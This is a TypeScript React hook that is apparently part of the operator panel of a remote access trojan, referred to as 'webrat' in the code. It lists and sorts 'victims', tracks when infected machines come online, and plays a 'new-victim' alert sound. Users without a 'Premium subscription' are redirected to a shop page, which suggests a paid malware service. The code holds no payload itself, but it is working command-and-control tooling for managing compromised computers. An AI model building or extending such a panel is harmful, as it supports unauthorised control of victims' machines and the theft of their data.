"use client";

import { useEffect, useMemo, useRef, useState } from "react";

import { useVictimsQuery } from "./use-victims-query";
import { showToast } from "../toast";
import type { Victim } from "../api/victims";
import { STORAGE_KEYS, readPref } from "../settings/storage";
import { dedupeVictims, stableSortVictims, type StatusSortMode } from "../panel/utils/victims-normalize";
import { isVictimOnline } from "../panel/utils/victim-status";

function readSortMode(): StatusSortMode {
    try {
        const raw = String(localStorage.getItem("webrat_status_sort") || "").trim();
        if (raw === "offline_first" || raw === "online_first") return raw;
    } catch {
    }
    return "online_first";
}

export function useVictimsList() {
    const q = useVictimsQuery();

    const [sortMode] = useState<StatusSortMode>(() => readSortMode());

    const stableIndexByKey = useMemo(() => new Map<string, number>(), []);
    const nextIndexRef = useMemo(() => ({ current: 1 }), []);

    const lastForbiddenToastAt = useRef(0);
    const lastUnauthorizedAt = useRef(0);

    const knownVictimKeys = useRef<Set<string>>(new Set());
    const knownVictimOnlineByKey = useRef<Map<string, boolean>>(new Map());
    const victimsLoadedOnce = useRef(false);
    const lastNewVictimToastAt = useRef(0);
    const lastOnlineVictimToastAt = useRef(0);
    const lastVictimCount = useRef(0);
    const soundRef = useRef<HTMLAudioElement | null>(null);

    const [ignoredVictimIdSet] = useState<Set<string>>(() => {
        try {
            const raw = String(readPref(STORAGE_KEYS.ignoredVictims) || "").trim();
            if (!raw) return new Set();
            const parsed = JSON.parse(raw);
            if (!Array.isArray(parsed)) return new Set();
            const list = parsed.map((x) => String(x || "").trim()).filter(Boolean);
            return new Set(list);
        } catch {
            return new Set();
        }
    });

    useEffect(() => {
        const err = q.error as (Error & { status?: number }) | null;
        const status = err?.status;

        if (status === 401) {
            const now = Date.now();
            if (now - lastUnauthorizedAt.current < 3000) return;
            lastUnauthorizedAt.current = now;
            try {
                window.location.href = "/login/";
            } catch {
                window.location.href = "/login/";
            }
            return;
        }

        if (status === 403) {
            const now = Date.now();
            if (now - lastForbiddenToastAt.current > 8000) {
                lastForbiddenToastAt.current = now;
                showToast("error", "You do not have Premium subscription");
            }
            try {
                if (window.location.hash.toLowerCase() !== "#shop") {
                    window.location.hash = "#shop";
                }
            } catch {
            }
        }
    }, [q.error]);

    const victims = useMemo(() => {
        const raw = (Array.isArray(q.data) ? q.data : []) as Victim[];
        const deduped = dedupeVictims(raw);
        const sorted = stableSortVictims({
            list: deduped,
            sortMode,
            stableIndexByKey,
            nextIndexRef,
        });

        if (!ignoredVictimIdSet.size) return sorted;
        return sorted.filter((v) => {
            const id = String((v as { id?: unknown }).id ?? "").trim();
            return !id || !ignoredVictimIdSet.has(id);
        });
    }, [ignoredVictimIdSet, nextIndexRef, q.data, sortMode, stableIndexByKey]);

    useEffect(() => {
        const list = Array.isArray(victims) ? victims : [];

        if (!victimsLoadedOnce.current) {
            if (Array.isArray(q.data) && list.length > 0) {
                victimsLoadedOnce.current = true;
                const initialKeys = new Set<string>();
                const initialOnline = new Map<string, boolean>();
                for (const v of list) {
                    const key = String((v as { id?: unknown })?.id ?? "").trim();
                    if (!key) continue;
                    initialKeys.add(key);
                    initialOnline.set(key, !!isVictimOnline(v));
                }
                knownVictimKeys.current = initialKeys;
                knownVictimOnlineByKey.current = initialOnline;
                lastVictimCount.current = list.length;
            }
            return;
        }

        const currentKeys = new Set<string>();
        const currentOnlineByKey = new Map<string, boolean>();

        let hasNew = false;
        let anyWentOnline = false;

        for (const v of list) {
            const key = String((v as { id?: unknown })?.id ?? "").trim();
            if (!key) continue;

            currentKeys.add(key);

            const onlineNow = !!isVictimOnline(v);
            currentOnlineByKey.set(key, onlineNow);

            if (knownVictimKeys.current.size > 0 && !knownVictimKeys.current.has(key)) {
                hasNew = true;
            }

            if (knownVictimOnlineByKey.current.size > 0) {
                const prevOnline = knownVictimOnlineByKey.current.get(key);
                if (prevOnline === false && onlineNow) {
                    anyWentOnline = true;
                }
            }
        }

        const countIncreased = list.length > lastVictimCount.current;
        lastVictimCount.current = list.length;

        const now = Date.now();
        if (hasNew && countIncreased && now - lastNewVictimToastAt.current > 5_000) {
            lastNewVictimToastAt.current = now;
            showToast("Warning", "New user has appeared in the panel.");
        }

        if (anyWentOnline && !hasNew && now - lastOnlineVictimToastAt.current > 5_000) {
            lastOnlineVictimToastAt.current = now;
            showToast("Warning", "New user has appeared in the panel.");

            let volume = 0.5;
            try {
                const raw = String(readPref(STORAGE_KEYS.sound) || "");
                const n = parseFloat(raw);
                if (!Number.isNaN(n) && Number.isFinite(n)) volume = Math.max(0, Math.min(1, n));
            } catch {
            }

            if (volume > 0.01) {
                try {
                    const a = soundRef.current || new Audio("/sounds/new-victim.mp3");
                    soundRef.current = a;
                    a.volume = volume;
                    a.currentTime = 0;
                    void a.play();
                } catch {
                }
            }
        }

        if (hasNew && countIncreased) {
            let volume = 0.5;
            try {
                const raw = String(readPref(STORAGE_KEYS.sound) || "");
                const n = parseFloat(raw);
                if (!Number.isNaN(n) && Number.isFinite(n)) volume = Math.max(0, Math.min(1, n));
            } catch {
            }

            if (volume > 0.01) {
                try {
                    const a = soundRef.current || new Audio("/sounds/new-victim.mp3");
                    soundRef.current = a;
                    a.volume = volume;
                    a.currentTime = 0;
                    void a.play();
                } catch {
                }
            }
        }

        knownVictimKeys.current = currentKeys;
        knownVictimOnlineByKey.current = currentOnlineByKey;
    }, [q.data, victims]);

    return {
        ...q,
        victims,
    };
}
